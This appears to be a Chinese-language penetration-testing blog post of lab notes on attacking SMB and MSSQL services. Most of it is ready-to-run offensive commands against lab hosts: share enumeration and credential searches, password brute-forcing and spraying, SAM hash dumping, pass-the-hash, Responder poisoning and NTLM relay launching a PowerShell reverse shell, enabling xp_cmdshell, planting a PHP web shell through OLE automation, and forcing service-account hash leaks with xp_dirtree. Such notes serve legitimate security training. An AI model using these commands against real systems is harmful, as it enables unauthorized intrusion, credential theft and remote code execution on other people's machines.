<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  <meta http-equiv="pragma" content="no-cache">
  <meta http-equiv="cache-control" content="no-cache">
  <meta http-equiv="expires" content="0">
  
  <title>Attacking Common Services | n2ryx&#39;s Blog</title>
  <meta name="author" content="n2ryx">
  
  <meta name="description" content="SMBTCP 445  用于直接通过 TCP&amp;#x2F;IP 传输的 SMB（常见于 SMBv2 和 SMBv3）
TCP&amp;#x2F;UDP 137-139 用于基于 NetBIOS 的 SMB（通常为 SMBv1）
Interact运行 | 文件夹1\\192.168.220.129\share\

cmd | powershell12C:\&amp;gt; dir \\192.168.220.129\share\PS C:\&amp;gt; Get-ChildItem \\192.168.220.129\share\

Mount SMB - CMD12345678910# 连接到文件共享并将其内容映射到驱动器号 nC:\&amp;gt; net use n: \\192.168.220.129\share [/user:uname passwd]# 统计文件数量C:\htb&amp;gt; dir n: /a-d /s /b | find /c &amp;quot;:\&amp;quot;# 查找特定文件C:\&amp;gt; dir n:\*cred* /s /b# orC:\&amp;gt; findstr /s /i cred n:\*.*"> 
  
  
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  <meta property="og:title" content="Attacking Common Services"/>
  <meta property="og:site_name" content="n2ryx&#39;s Blog"/>

  
    <meta property="og:image" content=""/>
  

  
    <link rel="alternative" href="/atom.xml" title="n2ryx&#39;s Blog" type="application/atom+xml">
  
  
    <link href="/favicon.png" rel="icon">
  
  
  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->

  <script src="/js/jquery-2.0.3.min.js"></script>

  <!-- analytics -->
  
  <!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-70812759-1"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-70812759-1');
</script>






<meta name="generator" content="Hexo 7.3.0"></head>

 <body>  
  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
    <div class="container">
      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
		<span class="sr-only">Toggle navigation</span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </button>
	  <a class="navbar-brand" href="/">n2ryx&#39;s Blog</a>
      <div class="collapse navbar-collapse nav-menu">
		<ul class="nav navbar-nav">
		  
		  <li>
			<a href="/archives" title="All the articles.">
			  <i class="fa fa-archive"></i>Archives
			</a>
		  </li>
		  
		  <li>
			<a href="/categories" title="All the categories.">
			  <i class="fa fa-folder"></i>Categories
			</a>
		  </li>
		  
		  <li>
			<a href="/tags" title="All the tags.">
			  <i class="fa fa-tags"></i>Tags
			</a>
		  </li>
		  
		  <li>
			<a href="/about" title="About me.">
			  <i class="fa fa-user"></i>About
			</a>
		  </li>
		  
		  <li>
			<a href="/tool" title="All the tools.">
			  <i class="fa fa-terminal"></i>Tool
			</a>
		  </li>
		  
		</ul>
      </div>
    </div> <!-- container -->
</nav>
<div class="clearfix"></div>

  <div class="container">
  	<div class="content">
    	 


	
		<div class="page-header">
			<h1> Attacking Common Services</h1>
		</div>
	



<div class="row post">
	<!-- cols -->
	
	<div id="top_meta"></div>
	<div class="col-md-9">
	

	<!-- content -->
	<div class="mypage">		
	  		

	  <h1 id="SMB"><a href="#SMB" class="headerlink" title="SMB"></a>SMB</h1><p>TCP 445  用于直接通过 TCP&#x2F;IP 传输的 SMB（常见于 SMBv2 和 SMBv3）</p>
<p>TCP&#x2F;UDP 137-139 用于基于 NetBIOS 的 SMB（通常为 SMBv1）</p>
<h2 id="Interact"><a href="#Interact" class="headerlink" title="Interact"></a>Interact</h2><h3 id="运行-文件夹"><a href="#运行-文件夹" class="headerlink" title="运行 | 文件夹"></a>运行 | 文件夹</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\\192.168.220.129\share\</span><br></pre></td></tr></table></figure>

<h3 id="cmd-powershell"><a href="#cmd-powershell" class="headerlink" title="cmd | powershell"></a>cmd | powershell</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">dir</span> \\192.168.220.129\<span class="title">share</span>\</span></span><br><span class="line"><span class="function"><span class="title">PS</span> <span class="title">C</span>:\&gt; <span class="title">Get</span>-<span class="title">ChildItem</span> \\192.168.220.129\<span class="title">share</span>\</span></span><br></pre></td></tr></table></figure>

<h3 id="Mount-SMB-CMD"><a href="#Mount-SMB-CMD" class="headerlink" title="Mount SMB - CMD"></a>Mount SMB - CMD</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># 连接到文件共享并将其内容映射到驱动器号 n</span><br><span class="line"><span class="function">C:\&gt; <span class="title">net</span> <span class="title">use</span> <span class="title">n</span>: \\192.168.220.129\<span class="title">share</span> [/<span class="title">user:uname</span> <span class="title">passwd</span>]</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"># 统计文件数量</span></span><br><span class="line"><span class="function"><span class="title">C</span>:\<span class="title">htb</span>&gt; <span class="title">dir</span> <span class="title">n</span>: /<span class="title">a</span>-<span class="title">d</span> /<span class="title">s</span> /<span class="title">b</span> | <span class="title">find</span> /<span class="title">c</span> &quot;:\&quot;</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"># 查找特定文件</span></span><br><span class="line"><span class="function"><span class="title">C</span>:\&gt; <span class="title">dir</span> <span class="title">n</span>:\*<span class="title">cred</span>* /<span class="title">s</span> /<span class="title">b</span></span></span><br><span class="line"><span class="function"># <span class="title">or</span></span></span><br><span class="line"><span class="function"><span class="title">C</span>:\&gt; <span class="title">findstr</span> /<span class="title">s</span> /<span class="title">i</span> <span class="title">cred</span> <span class="title">n</span>:\*.*</span></span><br></pre></td></tr></table></figure>

<h3 id="Mount-SMB-Powershell"><a href="#Mount-SMB-Powershell" class="headerlink" title="Mount SMB - Powershell"></a>Mount SMB - Powershell</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">New-PSDrive</span> <span class="literal">-Name</span> <span class="string">&quot;N&quot;</span> <span class="literal">-Root</span> <span class="string">&quot;\\192.168.220.129\share&quot;</span> <span class="literal">-PSProvider</span> <span class="string">&quot;FileSystem&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 凭证输入</span></span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="variable">$username</span> = <span class="string">&#x27;uname&#x27;</span></span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="variable">$password</span> = <span class="string">&#x27;passwd&#x27;</span></span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="variable">$secpassword</span> = <span class="built_in">ConvertTo-SecureString</span> <span class="variable">$password</span> <span class="literal">-AsPlainText</span> <span class="literal">-Force</span></span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="variable">$cred</span> = <span class="built_in">New-Object</span> System.Management.Automation.PSCredential <span class="variable">$username</span>, <span class="variable">$secpassword</span></span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">New-PSDrive</span> <span class="literal">-Name</span> <span class="string">&quot;N&quot;</span> <span class="literal">-Root</span> <span class="string">&quot;\\192.168.220.129\share&quot;</span> <span class="literal">-PSProvider</span> <span class="string">&quot;FileSystem&quot;</span> <span class="literal">-Credential</span> <span class="variable">$cred</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 切换驱动器</span></span><br><span class="line"><span class="built_in">PS</span> C:\&gt; N:</span><br><span class="line"></span><br><span class="line"><span class="comment"># 统计文件数量（缩写gci）</span></span><br><span class="line"><span class="built_in">PS</span> N:\&gt; (<span class="built_in">Get-ChildItem</span> <span class="operator">-File</span> <span class="literal">-Recurse</span> | <span class="built_in">Measure-Object</span>).Count</span><br><span class="line"><span class="number">29302</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查找特定文件</span></span><br><span class="line"><span class="built_in">PS</span> N:\&gt; <span class="built_in">Get-ChildItem</span> <span class="literal">-Recurse</span> <span class="literal">-Path</span> N:\ <span class="literal">-Include</span> *cred* <span class="operator">-File</span></span><br><span class="line">或</span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Get-ChildItem</span> <span class="literal">-Recurse</span> <span class="literal">-Path</span> N:\ | <span class="built_in">Select-String</span> <span class="string">&quot;cred&quot;</span> <span class="literal">-List</span></span><br></pre></td></tr></table></figure>

<h3 id="Mount-SMB-Linux"><a href="#Mount-SMB-Linux" class="headerlink" title="Mount SMB - Linux"></a>Mount SMB - Linux</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">sudo</span> <span class="built_in">mkdir</span> /mnt/Finance</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">sudo</span> mount -t cifs //192.168.220.129/share /mnt/share -o username=<span class="built_in">uname</span>,password=passwd,domain=.</span> </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使用文件凭证</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">mount -t cifs //192.168.220.129/share /mnt/share -o credentials=/path/credentialfile</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查找</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">find /mnt/Finance/ -name *cred*</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">匹配文件内容</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">grep -rn /mnt/Finance/ -ie cred</span></span><br></pre></td></tr></table></figure>

<p>凭证文件结构</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">username=uname</span><br><span class="line">password=passwd</span><br><span class="line">domain=.</span><br></pre></td></tr></table></figure>

<h2 id="External"><a href="#External" class="headerlink" title="External"></a>External</h2><h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$ sudo nmap 10.129.14.128 -sV -sC -p139,445</span><br><span class="line"></span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-19 15:15 CEST</span><br><span class="line">Nmap scan report for 10.129.14.128</span><br><span class="line">Host is up (0.00024s latency).</span><br><span class="line"></span><br><span class="line">PORT    STATE SERVICE     VERSION</span><br><span class="line">139/tcp open  netbios-ssn Samba smbd 4.6.2</span><br><span class="line">445/tcp open  netbios-ssn Samba smbd 4.6.2</span><br><span class="line">MAC Address: 00:00:00:00:00:00 (VMware)</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_nbstat: NetBIOS name: HTB, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   2.02: </span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2021-09-19T13:16:04</span><br><span class="line">|_  start_date: N/A</span><br></pre></td></tr></table></figure>

<h3 id="null-session"><a href="#null-session" class="headerlink" title="null session"></a>null session</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">smbclient -N -L //10.129.14.128</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">枚举每个共享文件夹的权限列表</span></span><br><span class="line">smbmap -H 10.129.14.128</span><br><span class="line">	-r [path] 枚举共享文件夹中的所有文件 或 指定共享文件夹</span><br><span class="line">	--download &quot;notes\note.txt&quot;</span><br><span class="line">	--upload test.txt &quot;notes\test.txt&quot;</span><br></pre></td></tr></table></figure>

<h3 id="rpc"><a href="#rpc" class="headerlink" title="rpc"></a>rpc</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ rpcclient -U&#x27;%&#x27; 10.10.110.17</span><br><span class="line">rpcclient $&gt; enumdomusers</span><br><span class="line"></span><br><span class="line">./enum4linux-ng.py 10.10.11.45 -A -C</span><br></pre></td></tr></table></figure>

<h3 id="crack"><a href="#crack" class="headerlink" title="crack"></a>crack</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -L users.list -P pws.list smb://10.129.220.123</span><br></pre></td></tr></table></figure>

<h3 id="spraying"><a href="#spraying" class="headerlink" title="spraying"></a>spraying</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p &#x27;Company01!&#x27; --local-auth</span><br><span class="line"># --continue-on-success 找到有效密码后继续喷洒</span><br><span class="line"># --local-auth 本地验证（未加入域使用）</span><br></pre></td></tr></table></figure>

<h2 id="Internal"><a href="#Internal" class="headerlink" title="Internal"></a>Internal</h2><h3 id="PsExec"><a href="#PsExec" class="headerlink" title="PsExec"></a>PsExec</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-psexec administrator:&#x27;Password123!&#x27;@10.10.110.17</span><br></pre></td></tr></table></figure>

<h3 id="CrackMapExec"><a href="#CrackMapExec" class="headerlink" title="CrackMapExec"></a>CrackMapExec</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">如果 --exec-method 没有定义，CrackMapExec 将尝试执行 atexec</span></span><br><span class="line">crackmapexec smb 10.10.110.17 -u Administrator -p &#x27;Password123!&#x27; -x &#x27;whoami&#x27; --exec-method smbexec</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">枚举同一网络内所有机器上的登录用户</span></span><br><span class="line">crackmapexec smb 10.10.110.0/24 -u administrator -p &#x27;Password123!&#x27; --loggedon-users</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">SAM数据库提取哈希值</span></span><br><span class="line">crackmapexec smb 10.10.110.17 -u administrator -p &#x27;Password123!&#x27; --sam</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">传递哈希 PTH</span></span><br><span class="line">crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE</span><br></pre></td></tr></table></figure>

<h3 id="Responder"><a href="#Responder" class="headerlink" title="Responder"></a>Responder</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 网络投毒</span><br><span class="line">sudo responder -I &lt;interface name&gt;</span><br></pre></td></tr></table></figure>

<p>如果我们无法破解哈希，我们可以使用<a target="_blank" rel="noopener" href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py">impacket-ntlmrelayx</a>或 Responder <a target="_blank" rel="noopener" href="https://github.com/lgandx/Responder/blob/master/tools/MultiRelay.py">MultiRelay.py</a>将捕获的哈希中继到另一台机器。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146</span><br><span class="line"></span><br><span class="line"># 反向shell Powershell #3 (Base64)</span><br><span class="line">impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c &#x27;powershell -e &lt;SNIP&gt;&#x27;</span><br></pre></td></tr></table></figure>

<h1 id="MSSQL"><a href="#MSSQL" class="headerlink" title="MSSQL"></a>MSSQL</h1><p>TCP 1433 UDP 1434 | “hidden” TCP 2433</p>
<p><code>MSSQL</code>默认系统模式&#x2F;数据库：</p>
<ul>
<li><code>master</code>- 保存 SQL Server 实例的信息。</li>
<li><code>msdb</code>- 由 SQL Server 代理使用。</li>
<li><code>model</code>- 为每个新数据库复制一个模板数据库。</li>
<li><code>resource</code>- 一个只读数据库，使系统对象在 sys 模式的服务器上的每个数据库中可见。</li>
<li><code>tempdb</code>- 为 SQL 查询保留临时对象。</li>
</ul>
<h2 id="interact"><a href="#interact" class="headerlink" title="interact"></a>interact</h2><p>如果我们不指定域或主机名，它将假定 SQL 身份验证并针对在 SQL Server 中创建的用户进行身份验证。相反，如果我们定义域或主机名，它将使用 Windows 身份验证。<code>SERVERNAME\\accountname</code>或<code>.\\accountname</code></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Linux - sqsh</span></span><br><span class="line">sqsh -S 10.129.20.13 -U username -P Password</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Windows - sqlcmd</span></span><br><span class="line">C:\&gt; sqlcmd -S 10.129.20.13 -U username -P Password123</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">sqlcmd需要在查询后使用GO来执行 SQL 语法。</span></span><br></pre></td></tr></table></figure>

<h2 id="nmap-1"><a href="#nmap-1" class="headerlink" title="nmap"></a>nmap</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">$ nmap -Pn -sV -sC -p1433 10.10.10.125</span><br><span class="line"></span><br><span class="line">Host discovery disabled (-Pn). All addresses will be marked &#x27;up&#x27;, and scan times will be slower.</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-26 02:09 BST</span><br><span class="line">Nmap scan report for 10.10.10.125</span><br><span class="line">Host is up (0.0099s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE SERVICE  VERSION</span><br><span class="line">1433/tcp open  ms-sql-s Microsoft SQL Server 2017 14.00.1000.00; RTM</span><br><span class="line">| ms-sql-ntlm-info: </span><br><span class="line">|   Target_Name: HTB</span><br><span class="line">|   NetBIOS_Domain_Name: HTB</span><br><span class="line">|   NetBIOS_Computer_Name: mssql-test</span><br><span class="line">|   DNS_Domain_Name: HTB.LOCAL</span><br><span class="line">|   DNS_Computer_Name: mssql-test.HTB.LOCAL</span><br><span class="line">|   DNS_Tree_Name: HTB.LOCAL</span><br><span class="line">|_  Product_Version: 10.0.17763</span><br><span class="line">| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback</span><br><span class="line">| Not valid before: 2021-08-26T01:04:36</span><br><span class="line">|_Not valid after:  2051-08-26T01:04:36</span><br><span class="line">|_ssl-date: 2021-08-26T01:11:58+00:00; +2m05s from scanner time.</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: mean: 2m04s, deviation: 0s, median: 2m04s</span><br><span class="line">| ms-sql-info: </span><br><span class="line">|   10.10.10.125:1433: </span><br><span class="line">|     Version: </span><br><span class="line">|       name: Microsoft SQL Server 2017 RTM</span><br><span class="line">|       number: 14.00.1000.00</span><br><span class="line">|       Product: Microsoft SQL Server 2017</span><br><span class="line">|       Service pack level: RTM</span><br><span class="line">|       Post-SP patches applied: false</span><br><span class="line">|_    TCP port: 1433</span><br></pre></td></tr></table></figure>

<h2 id="exec"><a href="#exec" class="headerlink" title="exec"></a>exec</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">连接数据库后的命令执行，需要权限，xp_cmdshell默认情况下禁用</span></span><br><span class="line">xp_cmdshell &#x27;whoami&#x27;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">开启，需要权限</span></span><br><span class="line">-- To allow advanced options to be changed.  </span><br><span class="line">EXECUTE sp_configure &#x27;show advanced options&#x27;, 1</span><br><span class="line">GO</span><br><span class="line"></span><br><span class="line">-- To update the currently configured value for advanced options.  </span><br><span class="line">RECONFIGURE</span><br><span class="line">GO  </span><br><span class="line"></span><br><span class="line">-- To enable the feature.  </span><br><span class="line">EXECUTE sp_configure &#x27;xp_cmdshell&#x27;, 1</span><br><span class="line">GO  </span><br><span class="line"></span><br><span class="line">-- To update the currently configured value for this feature.  </span><br><span class="line">RECONFIGURE</span><br><span class="line">GO</span><br></pre></td></tr></table></figure>

<h2 id="wirte"><a href="#wirte" class="headerlink" title="wirte"></a>wirte</h2><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"># 启用Ole 自动化程序（这需要管理员权限）</span><br><span class="line"><span class="number">1</span>&gt; sp_configure &#x27;show advanced options&#x27;, <span class="number">1</span></span><br><span class="line"><span class="number">2</span>&gt; GO</span><br><span class="line"><span class="number">3</span>&gt; RECONFIGURE</span><br><span class="line"><span class="number">4</span>&gt; GO</span><br><span class="line"><span class="number">5</span>&gt; sp_configure &#x27;Ole Automation Procedures&#x27;, <span class="number">1</span></span><br><span class="line"><span class="number">6</span>&gt; GO</span><br><span class="line"><span class="number">7</span>&gt; RECONFIGURE</span><br><span class="line"><span class="number">8</span>&gt; GO</span><br><span class="line"></span><br><span class="line"># 创建文件</span><br><span class="line"><span class="number">1</span>&gt; DECLARE @OLE INT</span><br><span class="line"><span class="number">2</span>&gt; DECLARE @FileID INT</span><br><span class="line"><span class="number">3</span>&gt; EXECUTE sp_OACreate &#x27;Scripting.FileSystemObject&#x27;, @OLE OUT</span><br><span class="line"><span class="number">4</span>&gt; EXECUTE sp_OAMethod @OLE, &#x27;OpenTextFile&#x27;, @FileID OUT, &#x27;c:\inetpub\wwwroot\webshell.php&#x27;, <span class="number">8</span>, <span class="number">1</span></span><br><span class="line"><span class="number">5</span>&gt; EXECUTE sp_OAMethod @FileID, &#x27;WriteLine&#x27;, Null, &#x27;&lt;?php <span class="built_in">echo</span> shell_exec($_GET[&quot;c&quot;]);?&gt;&#x27;</span><br><span class="line"><span class="number">6</span>&gt; EXECUTE sp_OADestroy @FileID</span><br><span class="line"><span class="number">7</span>&gt; EXECUTE sp_OADestroy @OLE</span><br><span class="line"><span class="number">8</span>&gt; GO</span><br></pre></td></tr></table></figure>

<h2 id="read"><a href="#read" class="headerlink" title="read"></a>read</h2><p>默认情况下，<code>MSSQL</code>允许读取操作系统中该帐户具有读取权限的任何文件。</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>&gt; SELECT * FROM OPENROWSET(BULK N&#x27;C:/Windows/System32/drivers/etc/hosts&#x27;, SINGLE_CLOB) AS Contents</span><br><span class="line"><span class="number">2</span>&gt; GO</span><br></pre></td></tr></table></figure>

<h2 id="Capture-Hash"><a href="#Capture-Hash" class="headerlink" title="Capture Hash"></a>Capture Hash</h2><p>使用 xp_subdirs 或 xp_dirtree 未记录的存储过程窃取 MSSQL 服务帐户哈希，这些存储过程使用 SMB 协议从文件系统中检索指定父目录下的子目录列表。当我们使用其中一个存储过程并将其指向我们的 SMB 服务器时，目录监听功能将强制服务器进行身份验证并发送运行 SQL Server 的服务帐户的 NTLMv2 哈希。</p>
<p>首先需要启动<a target="_blank" rel="noopener" href="https://github.com/lgandx/Responder">Responder</a>或<a target="_blank" rel="noopener" href="https://github.com/SecureAuthCorp/impacket">impacket-smbserver</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo responder -I tun0</span><br><span class="line">或</span><br><span class="line">sudo impacket-smbserver share ./ -smb2support</span><br></pre></td></tr></table></figure>

<p>再执行<code>xp_dirtree</code>或<code>xp_subdirs</code>查询</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1&gt; EXEC master..xp_dirtree &#x27;\\10.10.110.17\share\&#x27;</span><br><span class="line">2&gt; GO</span><br><span class="line"></span><br><span class="line"># or</span><br><span class="line"></span><br><span class="line">1&gt; EXEC master..xp_subdirs &#x27;\\10.10.110.17\share\&#x27;</span><br><span class="line">2&gt; GO</span><br></pre></td></tr></table></figure>

<h2 id="模拟现有用户"><a href="#模拟现有用户" class="headerlink" title="模拟现有用户"></a>模拟现有用户</h2><p>SQL Server 具有一项特殊权限，名为<code>IMPERSONATE</code>，允许执行用户承担其他用户或登录的权限，直到上下文重置或会话结束。</p>
<p><strong>注意：</strong>建议<code>EXECUTE AS LOGIN</code>在<code>master</code>数据库中运行，因为默认情况下所有用户都有权访问该数据库。如果您尝试模拟的用户无权访问您正在连接的数据库，则会出现错误。</p>
